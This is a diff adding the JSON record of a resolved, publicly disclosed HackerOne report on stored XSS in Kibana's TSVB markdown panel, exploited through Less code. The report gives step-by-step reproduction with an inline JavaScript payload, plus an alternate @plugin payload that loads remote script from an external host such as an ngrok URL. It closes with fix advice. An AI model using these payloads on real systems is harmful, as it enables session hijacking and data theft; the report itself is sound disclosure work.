@@ -1,0 +1,207 @@
+{
+  "id": 858874,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTg4NzQ=",
+  "url": "https://hackerone.com/reports/858874",
+  "title": "Stored XSS in TSVB Visualizations Markdown Panel",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-04-24T21:32:45.160Z",
+  "submitted_at": "2020-04-24T21:32:45.160Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jeremybuis",
+    "url": "/jeremybuis",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/oia7808w2k5qfar7hzcgosb2hsj3/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23607,
+    "url": "https://hackerone.com/elastic",
+    "handle": "elastic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Elastic",
+      "twitter_handle": "elastic",
+      "website": "https://www.elastic.co/",
+      "about": "Smarter search. Stronger security. Seamless observability. Uncover real-time insights with Search AI."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-07-28T18:53:28.254Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-07-28T18:20:42.182Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\n\n**Summary:** An authenticated user can save a TSVB visualization, which contains a stored cross-site scripting (XSS) payload in the included Less code as part of the markdown panel.\n\n**Description:** I've found a stored cross-site scripting (XSS) issue in the TSVB visualization. The Markdown panel accepts Custom CSS and Less. The proof-of-concept attack below shows how to create an XSS using the Less language.  By injecting a payload like: body { color: \\`confirm('XSS')\\`; } , a malicious user is able to gain JavaScript execution on the domain. When another authenticated user edits the Less code, the payload fires.\n\n## Steps To Reproduce:\n\nI created an instance of Kibana on cloud.elastic.co and performed the following:\n\n1. Login to Kibana and navigate to the visualizations page and click \"Create Visualization\"\n2. Select TSVB\n3. Navigate to the Markdown tab\n4. Navigate to the Panel options sub tab\n5. Place the following payload in the custom CSS editor:\n    body { color: \\`confirm('XSS')\\`; }\n6. Notice the Confirm dialog\n7. Save the visualization\n8. As another user, navigate to the visualizations custom css and edit the Less\n9. Notice the Confirm dialog\n\nA similar attack can be done on the demo.elastic.co Kibana instance as well. Heres a permalink to the example above: [Demo Kibana Less XSS](https://demo.elastic.co/app/kibana#/visualize/create?type=metrics&_g=()&_a=(filters:!(),linked:!f,query:(language:kuery,query:''),uiState:(),vis:(aggs:!(),params:(axis_formatter:number,axis_position:left,axis_scale:normal,default_index_pattern:'filebeat-*',default_timefield:'@timestamp',id:'61ca57f0-469d-11e7-af02-69e470af7417',index_pattern:'',interval:'',isModelInvalid:!f,markdown:'%23+Hello',markdown_css:'%23markdown-61ca57f0-469d-11e7-af02-69e470af7417+body%7Bcolor:true%7D',markdown_less:'%2F%2F+@plugin+%22https:%2F%2Fef358b0f.ngrok.io%2Fcxss.js%22;%0Abody+%7B+color:+%60confirm(!'XSS!')%60+%7D%0A%0A',series:!((axis_position:right,chart_type:line,color:%2368BC00,fill:0.5,formatter:number,id:'61ca57f1-469d-11e7-af02-69e470af7417',line_width:1,metrics:!((id:'61ca57f2-469d-11e7-af02-69e470af7417',type:count)),point_size:1,separate_axis:0,split_mode:everything,stacked:none)),show_grid:1,show_legend:1,time_field:'',type:markdown),title:'',type:metrics)))\n\n###Scenario\n\nA malicious user could create a scenario where the visualization is saved as part of a dashboard, and the processed CSS causes a problem with the view, inviting other users to try and fix the issue. When the other users try and fix the issue, they trigger the XSS payload. The malicious user could then perform actions as if the were the affected user, and potentially ex-filtrate sensitive data they didn't already have access too.\n\n###Alternate Payload\n\nIf including malicious JavaScript in the Less code is too obvious, the malicious user can include a Less plugin instead. The Less code would look like the following:\n\n```\n@plugin \"https://www.example.com/plugin\";\n```\nNotice that the \".js\" extension is not needed, further obfuscating the attack. The plugin code would look like the following:\n\n```\nconfirm(\"XSS Less plugin\");\nmodule.exports = {\n  install: function(less, pluginManager, functions) {\n    functions.add('xss', function(val) {\n      return val.value;\n    });\n  }\n};\n```\n\nThis approach is less obvious compared to the inline JS, when an unsuspecting user tries to modify the Less code.\n\n## Impact: XSS can be used to force users to download malware, navigate to malicious websites, or hijack users sessions. For Kibana, the vulnerability could allow an attacker to obtain sensitive information from or perform destructive actions on behalf of other Kibana users.\n\n### Recommendations:\n\nUpgrade to Less version 3.0 or greater and confirm that the Less option { javascriptEnabled: false } is properly configured. This will fix the inline JavaScript execution problem.\n\nThere is no fix at the moment for the plugin syntax as far as I know. I will be communicating with the Less team shortly to see what can be done.\n\n## Supporting Material/References:\n\n  * Two screenshots showing both the inline JavaScript injection and the Less plugin option against the demo.elastic.co instance\n  * Two screenshots showing both inline and plugin options against a deployment on https://cloud.elastic.co/\n  * My example Less plugin\n\n## Impact\n\nThe vulnerability could allow an attacker to obtain sensitive information from or perform destructive actions on behalf of other Kibana users",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 802759,
+      "file_name": "kibana-less-inline-xss.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2D9BY5vTKziyutddDSqoMk64?response-content-disposition=attachment%3B%20filename%3D%22kibana-less-inline-xss.PNG%22%3B%20filename%2A%3DUTF-8%27%27kibana-less-inline-xss.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6WUSXZV3%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T160001Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDZd0A5ty4W2yRuN7v3vaI7nG2XwPGZNkbEBk%2FOYkeBcgIhAP3DzIXCZyRDdRcAfAEYSzs7s3jhBji01ofK7j%2FbxnD0KrsFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwiNfOZNKfgTvBg1%2F8qjwWO88iij7LDHWe084xsTkVNIW1l0WCKCZ%2FgWWlbZ0bVtuLTfbO3z8pX84lYUmMvHHBm9akUl0zVMYdHOJdFCChuYam4RJkFIEgU%2BSPUSGHCQXSlbL1nPI51%2B%2FA5Z0YVzLuYFmg%2FCjnnXcDWZIUopDN%2FUxnl0NZktAE4ov3Jze270npqQXg8GE0j1t8LmHeW4nkz6dFNdDpSg%2FP9yPiGfluv3XAbGO61tfOfZJRY5WOw9ZiMp2AIwrIy2WnnCFaCogkhgTWXvGuW7gDcBusWPLKCG4nGcIYuvSjki2Vn2wV%2BSrEUxXB%2F69D05XjPwHM9Mjs6%2FnuiLtVbJnv9%2Br4XZBP1m48sQXMzSSls14pUjDFv6TWvlbxE8oAcofHbDJRCqs86OR%2Bc9u1kSdgZtuto%2BjxqkWih5lHCdV9taY%2BDLqWURCiUPd7j5W5kPSgJt3jLUqjLX%2FUMM91Zjtk8c9WR1Enew86nG5uvs2AjV2tyGTMSmOlbCcDNXTOZqfrSrwHY6AxC5exuADafFRMM7JdynAsje47x6HaPi2DZv7NMLsvEg9frVyeD%2Bk%2FbK5IGkUckqvU9AU4gLxZFo%2FmvSzOQIArbOILuzy%2F3w9YuTpPT9Q3WmDwOarXMY36YPB0ituePU2V4WQ0ee361Ggr3aOwZF5exou0pLGyVyhLrMVxxPGhHYjveTE0MWBCCK2TJ8EPqTIffnzceiykgclVvuaKtvPeBQNEmzGnBfPiJ1C1deZPcMY48BVUGRTC4BdpyZ0Njsyasj6XlmvkrDdL6rcjKfa2Vz4%2FJlTDbKToa3lnZ87M0TrR5lAGIjMOJdrmmhKd51aLiCG4n%2F%2F4ZZthcbk5%2F%2BohnraKzTWkAt1oNTN9LNetkMLWPltEGOrAB1UJl9m3NwGvp3SzL0FyMbRKOnJyhb5efJgxUHc50LL0hIJOPL%2FuGvU6%2BZyq6bZ7JF931riyQ4kyZ6xbw2HDGVRuGZ7trpNTuURgWOdYJoxOjjvt%2BS8E4Qe%2Fc2nO6RmTOsvENtExrvw%2FgaMO%2FU0bM0XfAk10nB5pT%2B9OEnqRqBcFKsHA7aY0KYJD5BrwVzUw9IW6v4Rgond0LBdYTfNmOHJKmU1r%2FDGz1wlOVGHy9EwQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2e148aeaa6572f75c7aeae3e3321e42c6d77959f4d7c88aa84ab1699c13e4720",
+      "file_size": 23311,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 802760,
+      "file_name": "kibana-less-inline-xss-v2.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nQRMuATsohuBjzpMK3fCqkLU?response-content-disposition=attachment%3B%20filename%3D%22kibana-less-inline-xss-v2.PNG%22%3B%20filename%2A%3DUTF-8%27%27kibana-less-inline-xss-v2.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6WUSXZV3%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T160001Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDZd0A5ty4W2yRuN7v3vaI7nG2XwPGZNkbEBk%2FOYkeBcgIhAP3DzIXCZyRDdRcAfAEYSzs7s3jhBji01ofK7j%2FbxnD0KrsFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwiNfOZNKfgTvBg1%2F8qjwWO88iij7LDHWe084xsTkVNIW1l0WCKCZ%2FgWWlbZ0bVtuLTfbO3z8pX84lYUmMvHHBm9akUl0zVMYdHOJdFCChuYam4RJkFIEgU%2BSPUSGHCQXSlbL1nPI51%2B%2FA5Z0YVzLuYFmg%2FCjnnXcDWZIUopDN%2FUxnl0NZktAE4ov3Jze270npqQXg8GE0j1t8LmHeW4nkz6dFNdDpSg%2FP9yPiGfluv3XAbGO61tfOfZJRY5WOw9ZiMp2AIwrIy2WnnCFaCogkhgTWXvGuW7gDcBusWPLKCG4nGcIYuvSjki2Vn2wV%2BSrEUxXB%2F69D05XjPwHM9Mjs6%2FnuiLtVbJnv9%2Br4XZBP1m48sQXMzSSls14pUjDFv6TWvlbxE8oAcofHbDJRCqs86OR%2Bc9u1kSdgZtuto%2BjxqkWih5lHCdV9taY%2BDLqWURCiUPd7j5W5kPSgJt3jLUqjLX%2FUMM91Zjtk8c9WR1Enew86nG5uvs2AjV2tyGTMSmOlbCcDNXTOZqfrSrwHY6AxC5exuADafFRMM7JdynAsje47x6HaPi2DZv7NMLsvEg9frVyeD%2Bk%2FbK5IGkUckqvU9AU4gLxZFo%2FmvSzOQIArbOILuzy%2F3w9YuTpPT9Q3WmDwOarXMY36YPB0ituePU2V4WQ0ee361Ggr3aOwZF5exou0pLGyVyhLrMVxxPGhHYjveTE0MWBCCK2TJ8EPqTIffnzceiykgclVvuaKtvPeBQNEmzGnBfPiJ1C1deZPcMY48BVUGRTC4BdpyZ0Njsyasj6XlmvkrDdL6rcjKfa2Vz4%2FJlTDbKToa3lnZ87M0TrR5lAGIjMOJdrmmhKd51aLiCG4n%2F%2F4ZZthcbk5%2F%2BohnraKzTWkAt1oNTN9LNetkMLWPltEGOrAB1UJl9m3NwGvp3SzL0FyMbRKOnJyhb5efJgxUHc50LL0hIJOPL%2FuGvU6%2BZyq6bZ7JF931riyQ4kyZ6xbw2HDGVRuGZ7trpNTuURgWOdYJoxOjjvt%2BS8E4Qe%2Fc2nO6RmTOsvENtExrvw%2FgaMO%2FU0bM0XfAk10nB5pT%2B9OEnqRqBcFKsHA7aY0KYJD5BrwVzUw9IW6v4Rgond0LBdYTfNmOHJKmU1r%2FDGz1wlOVGHy9EwQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d031683f91b256832dc9a8586b0164a82cf8b19e0d2bcf09fa06feafa1bca635",
+      "file_size": 60618,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 802761,
+      "file_name": "kibana-less-plugin-xss.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/FgK25tX4Vbhjr9wJ2LwxQocn?response-content-disposition=attachment%3B%20filename%3D%22kibana-less-plugin-xss.PNG%22%3B%20filename%2A%3DUTF-8%27%27kibana-less-plugin-xss.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6WUSXZV3%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T160001Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDZd0A5ty4W2yRuN7v3vaI7nG2XwPGZNkbEBk%2FOYkeBcgIhAP3DzIXCZyRDdRcAfAEYSzs7s3jhBji01ofK7j%2FbxnD0KrsFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwiNfOZNKfgTvBg1%2F8qjwWO88iij7LDHWe084xsTkVNIW1l0WCKCZ%2FgWWlbZ0bVtuLTfbO3z8pX84lYUmMvHHBm9akUl0zVMYdHOJdFCChuYam4RJkFIEgU%2BSPUSGHCQXSlbL1nPI51%2B%2FA5Z0YVzLuYFmg%2FCjnnXcDWZIUopDN%2FUxnl0NZktAE4ov3Jze270npqQXg8GE0j1t8LmHeW4nkz6dFNdDpSg%2FP9yPiGfluv3XAbGO61tfOfZJRY5WOw9ZiMp2AIwrIy2WnnCFaCogkhgTWXvGuW7gDcBusWPLKCG4nGcIYuvSjki2Vn2wV%2BSrEUxXB%2F69D05XjPwHM9Mjs6%2FnuiLtVbJnv9%2Br4XZBP1m48sQXMzSSls14pUjDFv6TWvlbxE8oAcofHbDJRCqs86OR%2Bc9u1kSdgZtuto%2BjxqkWih5lHCdV9taY%2BDLqWURCiUPd7j5W5kPSgJt3jLUqjLX%2FUMM91Zjtk8c9WR1Enew86nG5uvs2AjV2tyGTMSmOlbCcDNXTOZqfrSrwHY6AxC5exuADafFRMM7JdynAsje47x6HaPi2DZv7NMLsvEg9frVyeD%2Bk%2FbK5IGkUckqvU9AU4gLxZFo%2FmvSzOQIArbOILuzy%2F3w9YuTpPT9Q3WmDwOarXMY36YPB0ituePU2V4WQ0ee361Ggr3aOwZF5exou0pLGyVyhLrMVxxPGhHYjveTE0MWBCCK2TJ8EPqTIffnzceiykgclVvuaKtvPeBQNEmzGnBfPiJ1C1deZPcMY48BVUGRTC4BdpyZ0Njsyasj6XlmvkrDdL6rcjKfa2Vz4%2FJlTDbKToa3lnZ87M0TrR5lAGIjMOJdrmmhKd51aLiCG4n%2F%2F4ZZthcbk5%2F%2BohnraKzTWkAt1oNTN9LNetkMLWPltEGOrAB1UJl9m3NwGvp3SzL0FyMbRKOnJyhb5efJgxUHc50LL0hIJOPL%2FuGvU6%2BZyq6bZ7JF931riyQ4kyZ6xbw2HDGVRuGZ7trpNTuURgWOdYJoxOjjvt%2BS8E4Qe%2Fc2nO6RmTOsvENtExrvw%2FgaMO%2FU0bM0XfAk10nB5pT%2B9OEnqRqBcFKsHA7aY0KYJD5BrwVzUw9IW6v4Rgond0LBdYTfNmOHJKmU1r%2FDGz1wlOVGHy9EwQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e4cda76ff44a85e17e69cf8e505bdef797b626954d616eee4298fa51374055a3",
+      "file_size": 22519,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 802762,
+      "file_name": "kibana-less-plugin-xss-v2.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zBXiSpovYPF3n2Rbp6U1hqm7?response-content-disposition=attachment%3B%20filename%3D%22kibana-less-plugin-xss-v2.PNG%22%3B%20filename%2A%3DUTF-8%27%27kibana-less-plugin-xss-v2.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6WUSXZV3%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T160001Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDZd0A5ty4W2yRuN7v3vaI7nG2XwPGZNkbEBk%2FOYkeBcgIhAP3DzIXCZyRDdRcAfAEYSzs7s3jhBji01ofK7j%2FbxnD0KrsFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwiNfOZNKfgTvBg1%2F8qjwWO88iij7LDHWe084xsTkVNIW1l0WCKCZ%2FgWWlbZ0bVtuLTfbO3z8pX84lYUmMvHHBm9akUl0zVMYdHOJdFCChuYam4RJkFIEgU%2BSPUSGHCQXSlbL1nPI51%2B%2FA5Z0YVzLuYFmg%2FCjnnXcDWZIUopDN%2FUxnl0NZktAE4ov3Jze270npqQXg8GE0j1t8LmHeW4nkz6dFNdDpSg%2FP9yPiGfluv3XAbGO61tfOfZJRY5WOw9ZiMp2AIwrIy2WnnCFaCogkhgTWXvGuW7gDcBusWPLKCG4nGcIYuvSjki2Vn2wV%2BSrEUxXB%2F69D05XjPwHM9Mjs6%2FnuiLtVbJnv9%2Br4XZBP1m48sQXMzSSls14pUjDFv6TWvlbxE8oAcofHbDJRCqs86OR%2Bc9u1kSdgZtuto%2BjxqkWih5lHCdV9taY%2BDLqWURCiUPd7j5W5kPSgJt3jLUqjLX%2FUMM91Zjtk8c9WR1Enew86nG5uvs2AjV2tyGTMSmOlbCcDNXTOZqfrSrwHY6AxC5exuADafFRMM7JdynAsje47x6HaPi2DZv7NMLsvEg9frVyeD%2Bk%2FbK5IGkUckqvU9AU4gLxZFo%2FmvSzOQIArbOILuzy%2F3w9YuTpPT9Q3WmDwOarXMY36YPB0ituePU2V4WQ0ee361Ggr3aOwZF5exou0pLGyVyhLrMVxxPGhHYjveTE0MWBCCK2TJ8EPqTIffnzceiykgclVvuaKtvPeBQNEmzGnBfPiJ1C1deZPcMY48BVUGRTC4BdpyZ0Njsyasj6XlmvkrDdL6rcjKfa2Vz4%2FJlTDbKToa3lnZ87M0TrR5lAGIjMOJdrmmhKd51aLiCG4n%2F%2F4ZZthcbk5%2F%2BohnraKzTWkAt1oNTN9LNetkMLWPltEGOrAB1UJl9m3NwGvp3SzL0FyMbRKOnJyhb5efJgxUHc50LL0hIJOPL%2FuGvU6%2BZyq6bZ7JF931riyQ4kyZ6xbw2HDGVRuGZ7trpNTuURgWOdYJoxOjjvt%2BS8E4Qe%2Fc2nO6RmTOsvENtExrvw%2FgaMO%2FU0bM0XfAk10nB5pT%2B9OEnqRqBcFKsHA7aY0KYJD5BrwVzUw9IW6v4Rgond0LBdYTfNmOHJKmU1r%2FDGz1wlOVGHy9EwQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1cdd57e98ebf443f8c20c44bb1b17d7f640f4eb0a3e3b9287fd294c7474df0d0",
+      "file_size": 57084,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 802763,
+      "file_name": "cxss.js",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/F66PbJYtn6djn7ZP4DHvVL7H?response-content-disposition=attachment%3B%20filename%3D%22cxss.js%22%3B%20filename%2A%3DUTF-8%27%27cxss.js&response-content-type=text%2Fjavascript&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6WUSXZV3%2F20260607%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260607T160001Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDZd0A5ty4W2yRuN7v3vaI7nG2XwPGZNkbEBk%2FOYkeBcgIhAP3DzIXCZyRDdRcAfAEYSzs7s3jhBji01ofK7j%2FbxnD0KrsFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwiNfOZNKfgTvBg1%2F8qjwWO88iij7LDHWe084xsTkVNIW1l0WCKCZ%2FgWWlbZ0bVtuLTfbO3z8pX84lYUmMvHHBm9akUl0zVMYdHOJdFCChuYam4RJkFIEgU%2BSPUSGHCQXSlbL1nPI51%2B%2FA5Z0YVzLuYFmg%2FCjnnXcDWZIUopDN%2FUxnl0NZktAE4ov3Jze270npqQXg8GE0j1t8LmHeW4nkz6dFNdDpSg%2FP9yPiGfluv3XAbGO61tfOfZJRY5WOw9ZiMp2AIwrIy2WnnCFaCogkhgTWXvGuW7gDcBusWPLKCG4nGcIYuvSjki2Vn2wV%2BSrEUxXB%2F69D05XjPwHM9Mjs6%2FnuiLtVbJnv9%2Br4XZBP1m48sQXMzSSls14pUjDFv6TWvlbxE8oAcofHbDJRCqs86OR%2Bc9u1kSdgZtuto%2BjxqkWih5lHCdV9taY%2BDLqWURCiUPd7j5W5kPSgJt3jLUqjLX%2FUMM91Zjtk8c9WR1Enew86nG5uvs2AjV2tyGTMSmOlbCcDNXTOZqfrSrwHY6AxC5exuADafFRMM7JdynAsje47x6HaPi2DZv7NMLsvEg9frVyeD%2Bk%2FbK5IGkUckqvU9AU4gLxZFo%2FmvSzOQIArbOILuzy%2F3w9YuTpPT9Q3WmDwOarXMY36YPB0ituePU2V4WQ0ee361Ggr3aOwZF5exou0pLGyVyhLrMVxxPGhHYjveTE0MWBCCK2TJ8EPqTIffnzceiykgclVvuaKtvPeBQNEmzGnBfPiJ1C1deZPcMY48BVUGRTC4BdpyZ0Njsyasj6XlmvkrDdL6rcjKfa2Vz4%2FJlTDbKToa3lnZ87M0TrR5lAGIjMOJdrmmhKd51aLiCG4n%2F%2F4ZZthcbk5%2F%2BohnraKzTWkAt1oNTN9LNetkMLWPltEGOrAB1UJl9m3NwGvp3SzL0FyMbRKOnJyhb5efJgxUHc50LL0hIJOPL%2FuGvU6%2BZyq6bZ7JF931riyQ4kyZ6xbw2HDGVRuGZ7trpNTuURgWOdYJoxOjjvt%2BS8E4Qe%2Fc2nO6RmTOsvENtExrvw%2FgaMO%2FU0bM0XfAk10nB5pT%2B9OEnqRqBcFKsHA7aY0KYJD5BrwVzUw9IW6v4Rgond0LBdYTfNmOHJKmU1r%2FDGz1wlOVGHy9EwQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7a395024c2ec964404d6538890c682d859dd491140816079baaa0c736b36f5b6",
+      "file_size": 187,
+      "type": "text/javascript",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-08-27T18:20:42.321Z",
+  "allow_singular_disclosure_after": -182295559.60594985,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "alexbrasetvik",
+    "dee-see",
+    "isira_adithya",
+    "arupgiri721427",
+    "jeremybuis"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 5671,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.found.io",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "can_manage?": false,
+    "can_export?": false,
+    "can_add_comment?": false,
+    "can_request_decision_review_without_strict_acl_mode?": false,
+    "can_request_decision_review?": false,
+    "can_reject_decision_review?": false,
+    "can_change_state?": false,
+    "can_reopen?": false,
+    "can_award_bounty?": false,
+    "can_award_swag?": false,
+    "can_suggest_bounty_amount?": false,
+    "can_create_dupe_window_bounty?": false,
+    "can_assign_to_user?": false,
+    "can_assign_to_h1_triage?": false,
+    "can_hide_timeline?": false,
+    "can_agree_on_going_public?": false,
+    "can_cancel_disclosure_request?": false,
+    "can_be_publicly_disclosed?": false,
+    "can_post_internal_comments?": false,
+    "can_manage_common_responses?": false,
+    "can_use_common_responses?": false,
+    "can_reassign_to_team?": false,
+    "can_change_title?": false,
+    "can_change_vulnerability_information?": false,
+    "can_change_weakness?": false,
+    "can_be_manually_disclosed?": false,
+    "can_clone?": false,
+    "can_close_as_na?": false,
+    "can_close_as_duplicate?": false,
+    "can_close_as_informative?": false,
+    "can_close_as_spam?": false,
+    "can_close_as_resolved?": false,
+    "can_ban_researcher?": false,
+    "can_create_severity?": false,
+    "can_close_comments?": false,
+    "can_change_structured_scope?": false,
+    "can_manage_collaborators?": false,
+    "can_view_bounty_weights?": false,
+    "can_redact?": false,
+    "can_view_credential_account_details?": false,
+    "can_request_retest?": false,
+    "can_cancel_retest?": false,
+    "can_submit_draft?": false,
+    "can_delete_draft?": false,
+    "can_change_to_pending_program_review_state?": false,
+    "can_request_code_review?": false,
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "can_change_pentest": false,
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
